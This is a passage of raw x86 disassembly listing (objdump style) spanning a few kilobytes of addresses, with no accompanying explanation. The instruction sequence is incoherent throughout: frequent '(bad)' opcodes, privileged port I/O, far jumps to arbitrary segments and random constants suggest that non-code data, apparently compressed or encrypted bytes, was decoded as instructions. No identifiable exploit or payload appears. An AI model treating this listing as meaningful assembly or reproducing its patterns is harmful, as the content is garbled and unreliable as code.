  4138fe:	sbb    DWORD PTR [ebp-0x46f13afa],0x28f20dc
  413908:	mov    eax,0x4adf0add
  41390d:	out    0x2c,eax
  41390f:	stc    
  413910:	mov    eax,0x68111c39
  413915:	ss inc ebp
  413917:	pop    esp
  413918:	retf   
  413919:	fs jb  0x41395d
  41391c:	leave  
  41391d:	mov    ch,0x12
  41391f:	cmp    eax,0x44a5356a
  413924:	sub    eax,0x7b3c7a58
  413929:	out    dx,eax
  41392a:	lock in eax,0x17
  41392d:	mov    DWORD PTR [eax-0x1930012b],ebx
  413933:	aas    
  413934:	dec    ebp
  413935:	pop    edx
  413936:	or     BYTE PTR [ebx-0xa],bh
  413939:	mov    edx,0xd55d7d70
  41393e:	and    edx,DWORD PTR [ebp-0x35cea142]
  413944:	mov    al,BYTE PTR [eax+0x7d]
  413947:	mov    dl,0xb3
  413949:	mov    eax,0x64d9b3ee
  41394e:	mov    eax,ds:0x7573eccd
  413953:	push   edx
  413954:	mov    cl,0xec
  413956:	shl    esi,cl
  413958:	add    BYTE PTR [ebp+eiz*2+0x26],ch
  41395c:	scas   al,BYTE PTR es:[edi]
  41395d:	repnz das 
  41395f:	test   al,0x53
  413961:	lods   al,BYTE PTR ds:[esi]
  413962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413963:	mov    eax,ds:0xb2630ee6
  413968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413969:	push   es
  41396a:	retf   
  41396b:	(bad)
  41396e:	and    BYTE PTR [esi-0x421404f9],0x95
  413975:	daa    
  413976:	and    al,0x45
  413978:	inc    eax
  413979:	in     al,dx
  41397a:	sbb    DWORD PTR [eax],edi
  41397c:	sub    eax,0x5e473a6f
  413981:	ins    BYTE PTR es:[edi],dx
  413982:	(bad)  
  413983:	outs   dx,BYTE PTR ds:[esi]
  413984:	sbb    eax,0x721d70a1
  413989:	bound  ebp,QWORD PTR [edi]
  41398b:	dec    esi
  41398c:	push   cs
  41398d:	sbb    DWORD PTR [ecx-0x42],esi
  413990:	mov    edi,0xb65646f4
  413995:	out    dx,eax
  413996:	sar    DWORD PTR [ebx-0x26afddcf],0x38
  41399d:	popa   
  41399e:	fsubr  QWORD PTR [esi]
  4139a0:	dec    ecx
  4139a1:	and    ebp,DWORD PTR [edx]
  4139a3:	mov    eax,0xbf603273
  4139a8:	sub    ecx,edx
  4139aa:	(bad)  [edx-0x238830d3]
  4139b0:	cld    
  4139b1:	lods   eax,DWORD PTR ds:[esi]
  4139b2:	pop    ebp
  4139b3:	test   al,0xe
  4139b5:	inc    eax
  4139b6:	dec    esp
  4139b7:	retf   
  4139b8:	jg     0x41394a
  4139ba:	loopne 0x4139a0
  4139bc:	mov    ah,0x31
  4139be:	sti    
  4139bf:	aam    0xd6
  4139c1:	arpl   WORD PTR [edx-0x3919f126],sp
  4139c7:	shr    DWORD PTR [ecx+0x1d],0x3f
  4139cb:	or     dh,BYTE PTR [edx-0x77]
  4139ce:	mov    es,edi
  4139d0:	or     eax,0x2693dac6
  4139d5:	or     ecx,ebx
  4139d7:	cld    
  4139d8:	popf   
  4139d9:	or     DWORD PTR [ecx-0x7f],0x7809eaba
  4139e0:	sbb    BYTE PTR [eax+0x6a289bbc],ch
  4139e6:	cmp    BYTE PTR ds:0xb28abf04,dl
  4139ec:	pop    esp
  4139ed:	and    BYTE PTR [eax-0x6d],0xb8
  4139f1:	push   esi
  4139f2:	daa    
  4139f3:	or     BYTE PTR [eax],dh
  4139f5:	xchg   ecx,eax
  4139f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f7:	fcomp  st(4)
  4139f9:	xor    eax,0xabca0220
  4139fe:	lods   eax,DWORD PTR ds:[esi]
  4139ff:	inc    ebx
  413a00:	and    al,0x6d
  413a02:	(bad)  
  413a03:	fsubp  st(4),st
  413a05:	dec    edx
  413a06:	pushf  
  413a07:	push   ebp
  413a08:	aas    
  413a09:	pop    eax
  413a0a:	xchg   esi,eax
  413a0b:	das    
  413a0c:	adc    dh,BYTE PTR [esi+0x23]
  413a0f:	inc    ebp
  413a10:	fbld   TBYTE PTR [ecx-0x61]
  413a13:	xor    edx,DWORD PTR [edx-0x38]
  413a16:	add    BYTE PTR [eax-0x6aedad6f],dl
  413a1c:	stos   BYTE PTR es:[edi],al
  413a1d:	sub    eax,0x34ae85d1
  413a22:	fwait
  413a23:	das    
  413a24:	dec    edi
  413a25:	push   ecx
  413a26:	pop    es
  413a27:	adc    ecx,DWORD PTR [eax]
  413a29:	jmp    0x5984:0xbe10694c
  413a30:	jl     0x4139dd
  413a32:	mov    ebp,0x1f14fef6
  413a37:	in     al,0x3
  413a39:	out    0xd8,eax
  413a3b:	mov    eax,ds:0x3a465df4
  413a40:	out    dx,eax
  413a41:	dec    esp
  413a42:	xor    DWORD PTR [ebx],edx
  413a44:	jl     0x413a0a
  413a46:	push   edx
  413a47:	ins    DWORD PTR es:[edi],dx
  413a48:	(bad)  
  413a49:	sahf   
  413a4a:	stc    
  413a4b:	fs jmp 0x413aaf
  413a4e:	inc    eax
  413a4f:	bswap  ebp
  413a51:	ins    BYTE PTR es:[edi],dx
  413a52:	push   ebp
  413a53:	or     eax,0x9bb10b2
  413a58:	sti    
  413a59:	fdiv   QWORD PTR [ebp-0x3e]
  413a5c:	lea    ebx,[edx]
  413a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a5f:	test   BYTE PTR [eax+edx*8+0x2b],bl
  413a63:	(bad)  
  413a64:	retf   
  413a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a66:	pop    edx
  413a67:	mov    edx,0x302cbb87
  413a6c:	out    0x44,eax
  413a6e:	xor    esp,DWORD PTR [esi-0x7fe15a28]
  413a74:	lds    esp,FWORD PTR [ecx-0x225396a4]
  413a7a:	lods   al,BYTE PTR ds:[esi]
  413a7b:	jne    0x413a78
  413a7d:	sbb    BYTE PTR [edi+0x616fabac],ch
  413a83:	outs   dx,DWORD PTR ds:[esi]
  413a84:	(bad)  
  413a85:	mov    es,WORD PTR [ecx+ecx*4+0x5e]
  413a89:	out    0x89,al
  413a8b:	or     eax,0xda47cad7
  413a90:	in     eax,0xc9
  413a92:	test   eax,0x9f7e1020
  413a97:	mov    DWORD PTR [ebx],esi
  413a99:	pop    eax
  413a9a:	fisubr WORD PTR [ecx+0x3a]
  413a9d:	bound  esp,QWORD PTR [edx]
  413a9f:	sub    DWORD PTR [ecx],ebp
  413aa1:	or     BYTE PTR [esi+edx*8-0x1b],al
  413aa5:	fistp  DWORD PTR [eax]
  413aa7:	and    eax,0xf9f9aaa2
  413aac:	push   ebx
  413aad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413aae:	pop    ebp
  413aaf:	pushf  
  413ab0:	inc    edi
  413ab1:	jle    0x413aef
  413ab3:	ja     0x413aae
  413ab5:	rol    BYTE PTR [ebp-0x2b],1
  413ab8:	or     eax,0x8f2914b9
  413abd:	jb     0x413ad2
  413abf:	inc    ebp
  413ac0:	out    0x1f,eax
  413ac2:	push   edi
  413ac3:	ret    0xf27a
  413ac6:	push   ebx
  413ac7:	mov    ch,0x9d
  413ac9:	dec    eax
  413aca:	inc    eax
  413acb:	and    eax,DWORD PTR [esi]
  413acd:	ret    0xd19e
  413ad0:	stos   BYTE PTR es:[edi],al
  413ad1:	fs pop esi
  413ad3:	fwait
  413ad4:	pop    ds
  413ad5:	or     eax,0x737cf4f4
  413ada:	sub    BYTE PTR [ebp-0x1c5caeec],ah
  413ae0:	pop    ebp
  413ae1:	hlt    
  413ae2:	fdivp  st(2),st
  413ae4:	lahf   
  413ae5:	xsave  [ebp+0x2b]
  413ae9:	scas   al,BYTE PTR es:[edi]
  413aea:	repz gs mov bh,0x2
  413aee:	sub    cl,BYTE PTR ds:[eax+0x4336f316]
  413af5:	mov    esi,0x5d7cbaf3
  413afa:	test   BYTE PTR [edx],0x87
  413afd:	(bad)  
  413afe:	or     eax,0x4a831bf0
  413b03:	cmovae esp,edi
  413b06:	pop    ds
  413b07:	scas   al,BYTE PTR es:[edi]
  413b08:	stc    
  413b09:	call   0x3143:0x72a83685
  413b10:	lds    ebx,FWORD PTR [edx+0x58]
  413b13:	mov    ebx,0x6eb584cd
  413b18:	repnz (bad) 
  413b1a:	pop    esp
  413b1b:	clc    
  413b1c:	lods   eax,DWORD PTR ds:[esi]
  413b1d:	cmp    cl,BYTE PTR [eax]
  413b1f:	add    DWORD PTR [ebp+0x3094ea30],edx
  413b25:	pusha  
  413b26:	xor    eax,0x8f8ea0d2
  413b2b:	push   ss
  413b2c:	nop
  413b2d:	(bad)  
  413b2e:	mov    cl,0x6
  413b30:	adc    BYTE PTR ds:0x1f0ddf31,dh
  413b36:	sbb    ebp,DWORD PTR [esi+ecx*1+0x4c]
  413b3a:	imul   esi,DWORD PTR [edx+0xfc36b9a],0xf0044711
  413b44:	test   bh,ah
  413b46:	arpl   ax,sp
  413b48:	(bad)  
  413b4a:	pop    ebx
  413b4b:	cld    
  413b4c:	mov    ebp,0xf0178c5f
  413b51:	cwde   
  413b52:	dec    eax
  413b53:	mov    bh,0x3c
  413b55:	sub    ecx,DWORD PTR [edx+0x6e]
  413b58:	rol    DWORD PTR [esi+0x49a07e42],1
  413b5e:	clc    
  413b5f:	shr    BYTE PTR [ebx+0x18],cl
  413b62:	fwait
  413b63:	sbb    al,0xbc
  413b65:	mov    WORD PTR [esi-0xe],es
  413b68:	rol    DWORD PTR [ecx],0xa3
  413b6b:	gs add bh,dl
  413b6e:	push   0xffffffdc
  413b70:	or     ch,BYTE PTR [ebx+esi*1+0x21ed24df]
  413b77:	repz imul BYTE PTR [esi-0x3]
  413b7b:	jb     0x413be8
  413b7d:	jnp    0x413b1d
  413b7f:	xchg   DWORD PTR [ebp+0x47],eax
  413b82:	xchg   edi,eax
  413b83:	jmp    DWORD PTR [edi+0x48c83342]
  413b89:	inc    edi
  413b8a:	pop    edx
  413b8b:	pop    ebp
  413b8c:	pusha  
  413b8d:	inc    ebx
  413b8e:	add    eax,0x95f14b9
  413b93:	dec    ebp
  413b94:	fisubr WORD PTR [eax]
  413b96:	push   0xffffffab
  413b98:	jne    0x413b2c
  413b9a:	out    dx,al
  413b9b:	jnp    0x413ba9
  413b9d:	hlt    
  413b9e:	nop
  413b9f:	sbb    ebp,DWORD PTR [ebx-0x13aefe8f]
  413ba5:	scas   eax,DWORD PTR es:[edi]
  413ba6:	outs   dx,BYTE PTR ds:[esi]
  413ba7:	inc    ebx
  413ba8:	or     DWORD PTR [edi],ebx
  413baa:	add    eax,0xdb3067d1
  413baf:	lods   al,BYTE PTR ds:[esi]
  413bb0:	pop    es
  413bb1:	std    
  413bb2:	inc    ebx
  413bb3:	icebp  
  413bb4:	cwde   
  413bb5:	mov    edx,DWORD PTR [esi-0x5d86fbc7]
  413bbb:	sti    
  413bbc:	fsub   QWORD PTR [esi+esi*8+0x6f429bf6]
  413bc3:	push   edx
  413bc4:	dec    eax
  413bc5:	mov    ?,ebx
  413bc7:	push   ebx
  413bc8:	rol    DWORD PTR [ebx],0xb8
  413bcb:	mov    al,BYTE PTR [edi+ebp*2-0x13]
  413bcf:	(bad)
  413bd3:	cmp    al,0xe8
  413bd5:	or     al,0xbc
  413bd7:	push   0xfffffffc
  413bd9:	add    al,0x2d
  413bdb:	add    bl,cl
  413bdd:	mov    dl,0xac
  413bdf:	xchg   edi,eax
  413be0:	sub    al,cl
  413be2:	aad    0x71
  413be4:	loop   0x413be0
  413be6:	inc    ebx
  413be7:	sbb    eax,0xce72b0c
  413bec:	jae    0x413bb8
  413bee:	call   DWORD PTR [esi+0x6e9a86c7]
  413bf4:	add    dl,BYTE PTR [edi]
  413bf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bf7:	or     ebx,DWORD PTR [edx]
  413bf9:	push   ecx
  413bfa:	cmp    BYTE PTR [eax-0x79897fce],cl
  413c00:	xchg   esi,eax
  413c01:	mov    dh,0xd7
  413c03:	div    BYTE PTR [esi]
  413c05:	addr16 iret 
  413c07:	and    ah,dl
  413c09:	inc    esp
  413c0a:	jmp    0x3696:0xf3046270
  413c11:	hlt    
  413c12:	scas   eax,DWORD PTR es:[edi]
  413c13:	shl    DWORD PTR [edi-0x4e277811],cl
  413c19:	out    0xb3,eax
  413c1b:	shl    DWORD PTR [edi+0x41],0xe7
  413c1f:	xor    al,0x39
  413c21:	jno    0x413c10
  413c23:	out    dx,al
  413c24:	int    0x73
  413c26:	inc    esi
  413c27:	jecxz  0x413c3d
  413c29:	dec    ebp
  413c2a:	xchg   edx,eax
  413c2b:	cwde   
  413c2c:	(bad)  
  413c2d:	dec    ebp
  413c2e:	div    dl
  413c30:	adc    al,0x34
  413c32:	ins    DWORD PTR es:[edi],dx
  413c33:	cmp    ecx,ebx
  413c35:	fwait
  413c36:	in     al,dx
  413c37:	clc    
  413c38:	lds    ebp,FWORD PTR [esi]
  413c3a:	xor    BYTE PTR [esp+esi*1],0xd2
  413c3e:	sub    ebx,esp
  413c40:	(bad)  
  413c41:	pop    ecx
  413c42:	ins    DWORD PTR es:[edi],dx
  413c43:	jg     0x413c97
  413c45:	add    BYTE PTR [ebp-0x1598ceef],dl
  413c4b:	and    ah,BYTE PTR [ebp+ecx*8-0x2d]
  413c4f:	xchg   ecx,eax
  413c50:	and    eax,0x69b1ead6
  413c55:	mov    WORD PTR [ebx-0x2b784b15],ss
  413c5b:	and    BYTE PTR [edx+0x2a],bh
  413c5e:	ja     0x413c60
  413c60:	dec    edi
  413c61:	test   eax,0xf3fadc67
  413c66:	jl     0x413c29
  413c68:	pop    edi
  413c69:	scas   eax,DWORD PTR es:[edi]
  413c6a:	fs jl  0x413c74
  413c6d:	or     esp,esp
  413c6f:	push   esp
  413c70:	mov    esp,0x5e54f2f7
  413c75:	ins    DWORD PTR es:[edi],dx
  413c76:	cld    
  413c77:	and    edi,ebp
  413c79:	lods   al,BYTE PTR ds:[esi]
  413c7a:	mov    ebp,DWORD PTR [edx]
  413c7c:	mov    ecx,0x26269fd8
  413c81:	sub    BYTE PTR [ebx+eax*8-0x73e55f85],dl
  413c88:	idiv   DWORD PTR [edx+0x1493f9e6]
  413c8e:	xchg   DWORD PTR [eiz*1-0x7398fdfc],edi
  413c95:	and    al,0x35
  413c97:	xor    BYTE PTR [eax+esi*2+0x1e],0x4c
  413c9c:	add    DWORD PTR [esi+0x4f],edi
  413c9f:	add    dh,BYTE PTR [edx-0x78]
  413ca2:	es mov edx,0xcd4840e4
  413ca8:	inc    esi
  413ca9:	and    ebx,DWORD PTR [esi]
  413cab:	nop
  413cac:	(bad)
  413cb0:	loop   0x413ca8
  413cb2:	xlat   BYTE PTR ds:[ebx]
  413cb3:	mov    ebx,DWORD PTR [edx+0x2e]
  413cb6:	push   eax
  413cb7:	cmp    DWORD PTR ds:0xead8a894,edi
  413cbd:	mov    ebp,0xc207f17f
  413cc2:	push   ds
  413cc3:	test   eax,esi
  413cc5:	pop    esp
  413cc6:	or     eax,0xca61c561
  413ccb:	adc    eax,0xf0f8438e
  413cd0:	or     eax,edx
  413cd2:	in     eax,0xf3
  413cd4:	js     0x413c68
  413cd6:	cld    
  413cd7:	push   ecx
  413cd8:	push   0x387c65fc
  413cdd:	loope  0x413d28
  413cdf:	out    dx,eax
  413ce0:	mov    al,0x63
  413ce2:	test   ecx,esp
  413ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ce5:	mov    eax,ds:0x406bf18d
  413cea:	mov    ds:0xdde84877,ax
  413cf0:	mov    al,ds:0x179cc5cb
  413cf5:	jl     0x413d4e
  413cf7:	adc    DWORD PTR [ebp+eiz*8+0x34],ebp
  413cfb:	or     edi,DWORD PTR [edx+0x31]
  413cfe:	fimul  DWORD PTR [ebp+0xc]
  413d01:	sub    bh,ah
  413d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d05:	in     al,dx
  413d06:	cmp    ch,dh
  413d08:	add    edx,esi
  413d0a:	mov    al,ds:0xd28639c5
  413d0f:	int3   
  413d10:	les    ecx,FWORD PTR [ebp-0x58b831d6]
  413d16:	jecxz  0x413ca1
  413d18:	cld    
  413d19:	clc    
  413d1a:	pop    ds
  413d1b:	mov    al,ds:0xe7a19058
  413d20:	xchg   edx,eax
  413d21:	out    dx,al
  413d22:	lahf   
  413d23:	ret    0xc954
  413d26:	aaa    
  413d27:	push   es
  413d28:	mov    ah,0x7d
  413d2a:	aaa    
  413d2b:	hlt    
  413d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d2d:	dec    ecx
  413d2e:	pop    ebx
  413d2f:	inc    eax
  413d30:	ja     0x413d13
  413d32:	adc    ecx,DWORD PTR [ecx+0x42774eb]
  413d38:	rcl    DWORD PTR [ecx-0x4],0x6d
  413d3c:	cld    
  413d3d:	cmp    edx,DWORD PTR [edx+eax*4-0x79]
  413d41:	outs   dx,DWORD PTR ds:[esi]
  413d42:	push   esi
  413d43:	ret    0x3365
  413d46:	call   0x14bba825
  413d4b:	test   DWORD PTR [ebp+0x4fad832c],edx
  413d51:	inc    BYTE PTR [edi+0x3a]
  413d54:	mov    ch,0xec
  413d56:	or     DWORD PTR [ebp-0x4c],eax
  413d59:	lock int3 
  413d5b:	pop    ecx
  413d5c:	mov    edi,0x4dfa3bd
  413d61:	mov    eax,0xa9945005
  413d66:	aam    0x88
  413d68:	mov    DWORD PTR ds:0xd6791545,eax
  413d6e:	xchg   edx,eax
  413d6f:	add    ebp,DWORD PTR cs:[edi]
  413d72:	imul   edx,DWORD PTR [esi],0xffffffb8
  413d75:	in     al,0xf9
  413d77:	sbb    eax,ecx
  413d79:	in     al,dx
  413d7a:	paddw  mm1,QWORD PTR [ebx+0x13977432]
  413d81:	or     al,0x1d
  413d83:	xor    esp,DWORD PTR [ebx+0x4bb47e47]
  413d89:	sub    al,bl
  413d8b:	mov    dh,0x1f
  413d8d:	sbb    BYTE PTR [eax-0x1d],dl
  413d90:	xchg   BYTE PTR [ecx+0x5a14453f],dl
  413d96:	jae    0x413d80
  413d98:	or     ecx,DWORD PTR [ebx+0x7db0848d]
  413d9e:	cmp    ebx,DWORD PTR [ecx-0x23]
  413da1:	(bad)  [eax-0x75]
  413da4:	pusha  
  413da5:	adc    eax,0xead76541
  413daa:	inc    esp
  413dab:	rcr    bl,cl
  413dad:	sbb    esi,DWORD PTR [eax]
  413daf:	fnsave [eax-0x6acca109]
  413db5:	cmp    DWORD PTR [edx+0x1db53956],ebp
  413dbb:	adc    dh,BYTE PTR [ebp+0x36]
  413dbe:	popa   
  413dbf:	mov    ds:0x8b9dfa88,eax
  413dc4:	and    DWORD PTR [eax],esi
  413dc6:	xchg   ebx,eax
  413dc7:	pop    ss
  413dc8:	ins    DWORD PTR es:[edi],dx
  413dc9:	ret    
  413dca:	dec    ecx
  413dcb:	mov    ds:0x5dd4dddc,al
  413dd0:	mov    bh,0xa5
  413dd2:	loop   0x413dbd
  413dd4:	xor    eax,0x8bf6c896
  413dd9:	lock js 0x413d7a
  413ddc:	data16 mov WORD PTR es:[edi],?
  413de0:	(bad)  [ecx+0x529af7ef]
  413de6:	sahf   
  413de7:	jge    0x413d8d
  413de9:	push   edx
  413dea:	fdiv   st(6),st
  413dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ded:	retf   
  413dee:	fisttp QWORD PTR [ecx+esi*2]
  413df1:	pop    esi
  413df2:	and    DWORD PTR [eax],edx
  413df4:	cdq    
  413df5:	jne    0x413d7b
  413df7:	jp     0x413e37
  413df9:	bswap  esp
  413dfb:	fnstcw WORD PTR [edi+eax*8+0x22a0a213]
  413e02:	scas   eax,DWORD PTR es:[edi]
  413e03:	jl     0x413dc3
  413e05:	pop    es
  413e06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e07:	arpl   WORD PTR [esi],si
  413e09:	(bad)  
  413e0a:	lahf   
  413e0b:	mov    esp,0x5132d340
  413e10:	leave  
  413e11:	xlat   BYTE PTR ds:[ebx]
  413e12:	jnp    0x413db3
  413e14:	lods   eax,DWORD PTR ds:[esi]
  413e15:	repnz or ah,BYTE PTR [edi*1+0x3b0368ca]
  413e1d:	jmp    0x1232:0x480718ff
  413e24:	retf   
  413e25:	or     ebp,DWORD PTR [edi]
  413e27:	fdiv   QWORD PTR [esp+eiz*4+0x22]
  413e2b:	mov    bh,0xa8
  413e2d:	in     al,dx
  413e2e:	daa    
  413e2f:	cli    
  413e30:	int3   
  413e31:	mov    al,0x74
  413e33:	dec    ebp
  413e34:	fwait
  413e35:	push   cs
  413e36:	fwait
  413e37:	dec    esi
  413e38:	cmp    ecx,esi
  413e3a:	stos   DWORD PTR es:[edi],eax
  413e3b:	push   eax
  413e3c:	ret    0x869a
  413e3f:	or     eax,0x3cbc98df
  413e44:	out    0xf1,al
  413e46:	mov    esi,DWORD PTR [ebx]
  413e48:	aam    0x38
  413e4a:	jns    0x413e9e
  413e4c:	lahf   
  413e4d:	push   esp
  413e4e:	mov    bx,0xf9c7
  413e52:	xchg   ebp,eax
  413e53:	sti    
  413e54:	fild   WORD PTR [edx-0x5]
  413e57:	cmp    BYTE PTR [eax*8-0x5fdc719c],bh
  413e5e:	and    al,BYTE PTR [ebp-0xc84c87a]
  413e64:	push   ecx
  413e65:	scas   eax,DWORD PTR es:[edi]
  413e66:	dec    edi
  413e67:	sahf   
  413e68:	cmp    cl,BYTE PTR [ecx+eax*8-0x65e021ed]
  413e6f:	(bad)  
  413e70:	pop    ecx
  413e71:	jg     0x413e85
  413e73:	out    0x7b,eax
  413e75:	pop    ebp
  413e76:	xor    al,0x6c
  413e78:	jns    0x413e7e
  413e7a:	mov    ds:0x74dbe916,al
  413e7f:	dec    ecx
  413e80:	jns    0x413ef9
  413e82:	fisubr DWORD PTR [ecx]
  413e84:	aad    0xd
  413e86:	ret    0x62c6
  413e89:	lds    edx,FWORD PTR [edx-0x58c901c]
  413e8f:	jo     0x413e5a
  413e91:	jmp    0x7e3a:0xececa158
  413e98:	mov    eax,0x33a2cabe
  413e9d:	jle    0x413e2f
  413e9f:	add    eax,0xeb2ff62b
  413ea4:	pop    ds
  413ea5:	and    DWORD PTR [edx],esi
  413ea7:	pusha  
  413ea8:	xbegin 0x15f219fe
  413eae:	push   edi
  413eaf:	inc    esi
  413eb0:	call   0x27c72de2
  413eb5:	loope  0x413eb6
  413eb7:	mov    ecx,0x1efd027c
  413ebc:	jne    0x413ed5
  413ebe:	jge    0x413f20
  413ec0:	cmp    dl,BYTE PTR [edx]
  413ec2:	aaa    
  413ec3:	cmp    al,0x9
  413ec5:	pushf  
  413ec6:	in     eax,dx
  413ec7:	sahf   
  413ec8:	ins    DWORD PTR es:[edi],dx
  413ec9:	mov    dh,0x5
  413ecb:	jb     0x413f0b
  413ecd:	sub    eax,0x5d8a9e24
  413ed2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ed3:	js     0x413e96
  413ed5:	cmp    ebx,DWORD PTR [edx]
  413ed7:	loop   0x413ecb
  413ed9:	sbb    DWORD PTR [ebx-0x3e545339],ecx
  413edf:	mov    edx,0x35358455
  413ee4:	popf   
  413ee5:	(bad)  
  413ee7:	mov    edx,0xd73438a4
  413eec:	std    
  413eed:	add    dh,0xec
  413ef0:	pop    esp
  413ef1:	imul   esi,edi,0x42f1a131
  413ef7:	add    DWORD PTR [esi+edx*2],edx
  413efa:	cmp    ah,ch
  413efc:	cld    
  413efd:	lea    esp,[eax+0xc]
  413f00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f01:	hlt    
  413f02:	jge    0x413f6e
  413f04:	dec    edi
  413f05:	in     al,0x79
  413f07:	fcmovb st,st(2)
  413f09:	or     al,0x28
  413f0b:	dec    edx
  413f0c:	adc    DWORD PTR [edx+0x5b],0xffffffa1
  413f10:	jg     0x413ef1
  413f12:	jmp    0x413f0e
  413f14:	sub    bh,dl
  413f16:	mov    ch,0xc7
  413f18:	repnz (bad) [eax+0x32]
  413f1c:	jg     0x413eba
  413f1e:	push   ss
  413f1f:	cwde   
  413f20:	xor    BYTE PTR [esi-0x3b],dl
  413f23:	xchg   edi,eax
  413f24:	xchg   ebp,eax
  413f25:	fstp   DWORD PTR [edi+edx*1+0x1697a284]
  413f2c:	pop    esi
  413f2d:	xchg   ebx,eax
  413f2e:	fwait
  413f2f:	ds mov al,0x30
  413f32:	loopne 0x413ef8
  413f34:	ss (bad) 
  413f36:	push   ss
  413f37:	or     eax,0xe39375bd
  413f3c:	ins    BYTE PTR es:[edi],dx
  413f3d:	ja     0x413ef1
  413f3f:	pop    edi
  413f40:	enter  0x3103,0x24
  413f44:	cmp    DWORD PTR [edx],eax
  413f46:	mov    dl,0xe0
  413f48:	imul   esp,DWORD PTR [eax],0xffffffbf
  413f4b:	test   DWORD PTR [esi-0x5f5742ed],eax
  413f51:	(bad)  
  413f52:	mov    edi,0x89b375b9
  413f57:	mov    ebp,0x58be7be3
  413f5c:	jbe    0x413fb2
  413f5e:	pop    ds
  413f5f:	add    al,0xa5
  413f61:	out    dx,eax
  413f62:	ficomp DWORD PTR [eax+0x646c3baf]
  413f68:	pusha  
  413f69:	jno    0x413fea
  413f6b:	or     BYTE PTR [ebp-0x44],ch
  413f6e:	stos   DWORD PTR es:[edi],eax
  413f6f:	inc    edi
  413f70:	sub    eax,0xd9855f9d
  413f75:	(bad)  
  413f76:	idiv   BYTE PTR [ebx-0x59]
  413f79:	inc    ebp
  413f7a:	ficom  DWORD PTR [edi-0x55]
  413f7d:	test   eax,0x9c67eb9d
  413f82:	cmp    eax,0xe58aef72
  413f87:	je     0x413f4f
  413f89:	(bad)  
  413f8a:	popa   
  413f8b:	fcomp  st(5)
  413f8d:	or     edx,DWORD PTR [edi+0x2e359cd0]
  413f93:	in     al,dx
  413f94:	es inc ebp
  413f96:	test   BYTE PTR [edx],bl
  413f98:	jne    0x413f93
  413f9a:	inc    ebp
  413f9b:	and    DWORD PTR [eax-0x12],edx
  413f9e:	or     BYTE PTR [eax-0x39],bl
  413fa1:	pop    ds
  413fa2:	fs pop es
  413fa4:	or     BYTE PTR [ecx],dl
  413fa6:	pop    esp
  413fa7:	cmp    eax,0x652ad8c3
  413fac:	fsubr  DWORD PTR [ecx]
  413fae:	inc    esi
  413faf:	sti    
  413fb0:	loopne 0x413fe4
  413fb2:	arpl   dx,ax
  413fb4:	std    
  413fb5:	pushf  
  413fb6:	sbb    DWORD PTR [ecx],ebp
  413fb8:	xor    ah,BYTE PTR ds:0x332eb100
  413fbe:	ret    
  413fbf:	xor    al,0xe2
  413fc1:	sar    BYTE PTR [ecx+0x6f],1
  413fc4:	pop    ebp
  413fc5:	shl    al,0x36
  413fc8:	std    
  413fc9:	test   DWORD PTR [edi],ebp
  413fcb:	cwde   
  413fcc:	aad    0x81
  413fce:	push   0x4ac0a7fc
  413fd3:	jl     0x413f59
  413fd5:	ss sbb cl,dh
  413fd8:	outs   dx,BYTE PTR ds:[esi]
  413fd9:	fistp  QWORD PTR [eax]
  413fdb:	out    dx,eax
  413fdc:	idiv   DWORD PTR [esi+ebx*4+0x4a]
  413fe0:	sti    
  413fe1:	call   0xa17bd4a3
  413fe6:	cmp    BYTE PTR [edx+0x4e],ah
  413fe9:	retf   
  413fea:	xor    ch,dh
  413fec:	sbb    ebp,DWORD PTR [esp+esi*1]
  413fef:	mov    esi,0xbb827617
  413ff4:	test   DWORD PTR [edx],0xa687bf6d
  413ffa:	hlt    
  413ffb:	lods   eax,DWORD PTR ds:[esi]
  413ffc:	and    BYTE PTR [edi],bh
  413ffe:	push   ebp
  413fff:	xor    BYTE PTR [ebx-0x1c],0x87
  414003:	jg     0x413fe8
  414005:	jg     0x413fbc
  414007:	pop    edi
  414008:	rcl    BYTE PTR [edx-0x444331ff],0x41
  41400f:	mov    cl,0xc4
  414011:	loopne 0x41406c
  414013:	arpl   dx,sp
  414015:	fldenv [edi+0x38]
  414018:	jmp    0x23549ca4
  41401d:	imul   esp,DWORD PTR [edx+0x7e64684],0x6c644b1b
  414027:	adc    BYTE PTR [ebx+0x5cf23bb1],bl
  41402d:	imul   eax,DWORD PTR ds:0x267ac411,0x745e8c52
  414037:	inc    ebp
  414038:	xchg   BYTE PTR [edi],dl
  41403a:	ss pop esp
  41403c:	sbb    ah,ah
  41403e:	sbb    esi,DWORD PTR [edi+ebp*8-0x23b8bb19]
  414045:	aam    0x58
  414047:	into   
  414048:	and    eax,0x8565422d
  41404d:	sar    BYTE PTR [ecx+0x43],cl
  414050:	inc    ebx
  414051:	cmp    cl,BYTE PTR [esi+0x5c]
  414054:	enter  0x4a6e,0x75
  414058:	push   ecx
  414059:	push   0xd392409
  41405e:	sbb    BYTE PTR [ebx-0x69],dl
  414061:	cmp    dh,bh
  414063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414064:	leave  
  414065:	push   es
  414066:	pop    DWORD PTR ds:0x95e81bef
  41406c:	xor    BYTE PTR [edi+0x20134870],0xb6
  414073:	cmp    eax,0xeb81486b
  414078:	cmp    esi,DWORD PTR [ecx]
  41407a:	outs   dx,DWORD PTR ds:[esi]
  41407b:	(bad)  
  41407c:	clc    
  41407d:	stc    
  41407e:	add    dh,ch
  414080:	xor    esi,DWORD PTR [edx+ecx*4]
  414083:	pop    ebp
  414084:	mov    bh,0x10
  414086:	out    dx,al
  414087:	cld    
  414088:	jecxz  0x41407f
  41408a:	leave  
  41408b:	outs   dx,BYTE PTR ds:[esi]
  41408c:	pop    ebx
  41408d:	bound  ebp,QWORD PTR [eax]
